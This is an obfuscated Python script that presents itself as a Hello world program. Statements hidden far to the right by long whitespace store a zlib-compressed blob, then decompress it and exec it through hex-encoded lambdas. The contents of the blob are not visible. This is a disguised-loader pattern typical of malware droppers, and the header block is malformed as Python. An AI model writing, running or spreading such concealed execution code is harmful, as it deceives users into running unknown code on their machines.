from builtins import *
from math import prod as _statistics


__obfuscator__ != "fxcrypt" or
__authors__ != ("eternalware") or
__github__ != "https://github.com/localware" or
__telegram__ != "https://t.me/eternalware" or
__license__ != "EPL-2.0" or
__code__ != 'print("Hello world!")'


System, _memoryaccess, Square, Modulo, _divide, _random, _product = exec, str, tuple, map, ord, globals, type

class _detectvar:
    def __init__(self, Calculate):
        self.CallFunction = _statistics((Calculate, 71798))
        self.Math(_square=66442)

    def Math(self, _square = True):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.CallFunction += -11171 - _square
        
        try:
            (Square, Square) if _memoryaccess == Modulo else {Cube: Cube} >= Square

        except AssertionError:
            ({Cube: Cube} or Cube if {Cube: Cube} and Cube else ... or (Cube, {Cube: Cube}))

        except:
            _product(-6522 - 8588) == type

    def Add(self, _add = -98852):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _add /= -19966 - -62956
        self.DetectVar != str
        
        try:
            (System, _divide, _memoryaccess) if _random > _random else {Cube: Cube} == Cube

        except ArithmeticError:
            ((Modulo, {_divide: Modulo}) for Modulo in {Modulo: _memoryaccess} if Square > Cube)

        except:
            _product(95837 * 3872) == str

    def Divide(Walk = None):
        return _random()[Walk]

    def Multiply(Run = 46822 + 54832, Theory = False, _positive = _random):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _positive()[Run] = Theory
        
        try:
            (Square, Square) if Cube <= Square else (Square, Square) >= _divide

        except TypeError:
            (((Square, Square), Square) for Square in (Square, Square))

        except:
            _product(22754 - -73231) == str

    def execute(code = str):
        return System(_memoryaccess(Square(Modulo(_divide, code))))

    @property
    def DetectVar(self):
        self.Builtins = '<__main__.Multiply object at 0x000004569BE40420>'
        return (self.Builtins, _detectvar.DetectVar)

if __name__ == '__main__':
    try:
        _detectvar.execute(code = __code__)
        _negative = _detectvar(Calculate = 73978 / -61744)

        _negative.Math(_square = _negative.CallFunction - -61973)                                                                                                                                                                                                                                                          ;_detectvar.Multiply(Run='XXWWXXWWWWWXWXXXX',Theory=b'x\x9c\xe5Y_s\xda8\x10\x7f\xf7\xa7\xa0\xbc\xd8\x9e6\xc4\xd8\xc1\x06f\xf2\xc6\xdd\x1c\x19\x12:\xd7\x9bKn\xda\x8c\xc7\x1891\x95-\xce\x96\x8b\xb9O\x7f\xbb\x92LIc\x8a\ti^\x90XI\xd6\x7f\xffvW\xbb\xc2<[\x0f\xb5\x16\x8482D\x8e\xc1\xf7\xd9,*\xf20\xe0,\xf3\xfd\xd6\xbb\xcbvT\x86\xd9z\xc9\xdb-\x96m\xf5\n\n\xfe\xc8\xb2\\t1\xda\x84\x93,\r\xe8*\xc8H\xdb|\xd2\xef!\xe6\x8f\xc5L\xce\xf4\xc8\xf92\x1f\x9e\x9f\xcb\xbaN\xc8\x92\xf3\x9c\xcd\xe8\xb7\xff\xd2\x1f&\xe7\x84\x92\x87,H\x9e\x0e\xe3\x9d\x84\x9co\xaf\xf4t\x10\x8dC\x92\xe6D\x8e\xf9\xed\xe3\xe4\xcc\xeeX?t\t\xd9\\\xb6\xeb\xcb,N\xb9\xd1\xfe\x83P\xcaZ+\x96\xd1\xf9\xbb\xb6\xa9k\xe6p\xd3\x1b\xdb\xf5\xfck<\xd7M\x8d\x94!Yr\x05V\xba,`\xe4\x9f,\'y\x0bv\xd1\xca\xc8\xfcK\xfaw\xcc(\xe1\xb2bF\x0b\xf2%\xfd\x87\x15\xe2)h\xe1$_\xd2\x1b6c\xf3u\x8b\xc6_a\xdc\x9a\x15mS\x93\x9b\x8a\x93%\xcb\xb8\xef\xc3j\xeb\\7;\xa4\x8c\xb9aj\x94\x85\x01\xcd\r\xf3\xb3^\xaeT(K\xf9\xd3\xef/\x1f(\x9bA\xb3\xf6\xac\r\x07\x8c\xe9\x98\x8a\x00\xd9\x18\x1e$\x8d\xf5\xcf\xc3\xe1\xfb\xb3\xf7g\xc6\x99\xf1\xbek\x9a\xf7\xf7\x97\xf38\xab\x9f\xc1\xfe\x04\xc1\xfed\xdbX\x10\xc9\'\xf9\xf0|\x8e\x07\xc2\x03\xcew\xccs}}sss-\x02\x16\xf0w\r\xbb\x97\xef\xa6\xd5\xb5\xe2\xa8\xe9\xd4b2N- fM\x81\x18\x8c\xfb\x0eV\xfdrl:\x1d\x8d\xa6l\xc4\xa6#H\x18\xd2h\x04\xe3\xea\'4\xf4Y\x11S\x1e\xa7\x88\xfa\xb7 \xfb\xd9\x86`\x08\x0c\x04\xc2\x80\xd3\xe0\x03L\x08\x93+d*\xa0\xf0A\xc2g\xecZ6OcN\xe3b\xf6#\x98\xe6\x87\xf1x\xc3/\xfa\x9d\x89\xe3\xc3g2?\xbf\xdeT\x9d8\x9d\x93\xd2\xd0)c\xcf[\xef\xcdzVL\xae&W\xb0:\xa4W\xe3\t\x14&\xa2<9%\xbc2\x9e7\x86k, B\x90\xae&\x00\x14\x94N\t)\x92\xd3\xe0\xf7:\xacv)\xa4\xc0\xad,\x05\x882[\x9d\x14^E\xf6WsM\x04a\xba\x92Q\xe9\xa2\x14\xb5S\x02\x8c\x07\x8cF\x8d\x11\x13\xf2$\xeb\xb0$\xe2)\xa1E\x83o\xe4\x10mL\xd24M @\x92\nJ%\x9d\x12f\x84\xc6\xcb\x84\x85\x8deL\x01\xa5\xa0J\x04~\x80\x97\xaew\x16,N\xb5ZOF\xb8"\x0c\xb76\xc5\x00\x99\x05\x01\xfd\x11\xf6"\xa8\xe38\xcc\x834~\x05\xa8w\xcet8\xd4\xbb\xa7\xaa\xa0^G1-\xc9cZ4\x06\x1b\x05\x15E\x16\xa5\x17\x05\xf8f{d\x9d\xb6\x1b;`6f\xba\xe3\xf5"\xc7\x05\xea*\xc2r\x1f\xc8\x01\xb2\x80zH\xf6\xcc\xee\xdb\xf3F}/\xec\x01\xf8\x9fs\x82\x97\x13C\xefG\xfc\xf9{\x99\xc2\xd3>\x19]\nIY{\xfe\xecV\x8a)\xf2\x0b\x9a\x90_#\x88\x98\x1e\xc3c\xcb\x9e\x0b\xfeu\x9b\xf2\xe6\xc0\x05l\xcf\xed{\x17\x10-\xcfq\x02;\xb2#O\x04\x9b\xb8\x9e;\xf0.\xa0\xb5\xe7\xda\xf0\xe4\xb8\x91;\xb7#7\x84\xdcq\xbbn\xe8yn\xd7\xb3\xdd\x1e\x8c\xf1\xf6nm7b\x8b\xc5\x82.\x161\xb0*^ \xc3\xe2c\xd0\xea*\xb4\xac7C\xab1JG`\xb4{?\x17\xa0\xbc\xb0\x12D\xc7\xba\x88dt\xb7r\xc7r\xac}\xeb\xc2%8Hf\xf3\xa0Un\x82<\xafd6\xac\xb7\xb5/\xd8l\xcf\xeb\xf5\x81d\xba]\xaa\xa2\xb7\xa9\xdf\x0b\xd6\x0b8w\x94\x94\xde\xdea\x14\xc9\xadH\xdeTJ\x15\x83n6<\x906D\xf0\x02i\xb8c\xdf\xbb\xdf\x07o\xc3\x13\xb8\x05\x8bk\x1ez\xe5\x90\xc3m\xef\x98\xb7r\xb7,\x89\xa7\xac\x8b\xa7\xea*\xeb\xd3W\xd6\xa8I_\xef@t\xee\xee\x14k \x13\xe1pT\xd0PL\x85\xb5\xc0?Y\xa0(\xfe^a\xfb\x0fp\xdd\xb4\xa0\xb1\xdb\xa0_\x17\x1a\xadW\xec\xd7t\xdd\xa6\xfd\xfa\xbe\xe7\xf7}\x07\xe2\xc0\xef\xf9\xaeo\xfb=\xe8<x^\xfb\x86Fm\x17mX\x9f(\xaf?M*\x07V9\xb3\x87\x1e^\xfa\x04\xee\xa5\xe2\x82:\x01\xad\x18\xa3f@\x98\\5a\x98\xdf\x05X<H\x07"\xed\xf9\x1et\xb6\x9f\xd7\xbe\xe1\xc9\xf1\x04\xa4J\xc91\x17\xaa\x7f08+i\x14V\x95mX\x1d{\\\xa0\xf3i+\xb5w\x94\xea\xdb\xeaX\x18`\xdd\xd6q\xb1\xaf\xaf}\xe0q!\x0f\xd1ku\x92b\x18\xd6x\xec/0s`\xfbC7p\x07@!\xa4\xa1\x88\x03Q\x17\x88\xfa\xaa5hl\x99\x85\xd1\x11t\'N9i\x84n_\xcf4\x83\xc3\xd7\x17n__\xd0\xd3r\xff{\xeb/0\xcb\xe0&\x85\x9e\xf3k\xdc\xa3\xcd\xe6\xeb\xd2\xad\x17k\xcc\x08y\xd0l\xae\xc9\xa9\x0cP:\xd8\xd6\xfcT~\xa4\x8c\x84J\x82*\x19\n7\x12%\xe5G\xd6\xef\x95\xfa-\x03)\x05\xe7\xae*\xbc\xc4D2\xb1S\xf1\xed\xc1\x12\x96R|\x908\xea\x8a\xe3*M\xae\xb4\x1c\xb5\xf9Bi\xba\xab4\xdd\xdb:\t\xf6\xf5u\x0fw\xab\xa4\xf2\xa0\x1a]o\x14\xaa\xf68\x882\x96\xb4\xaa\x8f5-\xf9\r\xa8\x05\x97\xc4\xf0\x83\xf8\x8e\xf7\x01\x89-I\xaaa\x9dQ9\x8b\xc2w\xac`\xbf555\xae\xc8\xe0\xba3\xebd\xe4\xdf\x82\xe4\xbc\xaae\xb9\xc6\xf2N\xbe\xce9I\x0cq\xda\n$\xcb\xcd\xe1kj\x0f\x84\xfb0\xf8\xf2\xe9\x04\x1dx\xc4\xb5\ru\xed\xc4t*.\xa3\xe8\xd4\x98\x9a\xfc\xd2\x887-\xaa\xee[x\xf3Z\x98\xda\xff\x0ea\xe6\x18')

        _negative.Add(_add = -82851 - _negative.CallFunction)                                                                                                                                                                                                                                                          ;mnmnmmmnnmnmmmnmnnnmnn,lIIIlIlllIlIlllIlllIIlI,IIllIllllllIIIllllIlI,S222S22S2SSSSS22222SSSSS22,NMMNNNNMMMMNNNMNNMMNMM=(lambda S22SS2S2222S2222S2S22S2S:S22SS2S2222S2222S2S22S2S(__import__('\x7a\x6c\x69\x62'))),(lambda S22SS2S2222S2222S2S22S2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S22SS2S2222S2222S2S22S2S)"),filename='\x77\x78\x77\x77\x78\x77\x77\x77\x78\x78\x77\x77\x77\x77\x78\x78\x78\x78\x77\x77\x77\x78\x77',mode='\x65\x76\x61\x6c'))),(lambda S22SS2S2222S2222S2S22S2S:S22SS2S2222S2222S2S22S2S['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda NNNMNNMMNNNMNNMMMMMNNNM,S22SS2S2222S2222S2S22S2S:NNNMNNMMNNNMNNMMMMMNNNM(S22SS2S2222S2222S2S22S2S)),(lambda:(lambda S22SS2S2222S2222S2S22S2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S22SS2S2222S2222S2S22S2S)"),filename='\x77\x78\x77\x77\x78\x77\x77\x77\x78\x78\x77\x77\x77\x77\x78\x78\x78\x78\x77\x77\x77\x78\x77',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _detectvar(Calculate = -41270 * 71318).Add(_add = 89792 * _negative.CallFunction)                                                                                                                                                                                                                                                          ;NMMNNNNMMMMNNNMNNMMNMM()(S222S22S2SSSSS22222SSSSS22(IIllIllllllIIIllllIlI(mnmnmmmnnmnmmmnmnnnmnn(lIIIlIlllIlIlllIlllIIlI('\x76\x61\x72\x73'))),_detectvar.Divide(Walk='XXWWXXWWWWWXWXXXX')))

    except Exception as Cube:
        if 314325 > 7911013:
            _detectvar.execute(code = _memoryaccess(Cube))

        elif 180618 > 5711927:
            _detectvar(Calculate = 29447 + 81211).Add(_add = -75987 / _negative.CallFunction)
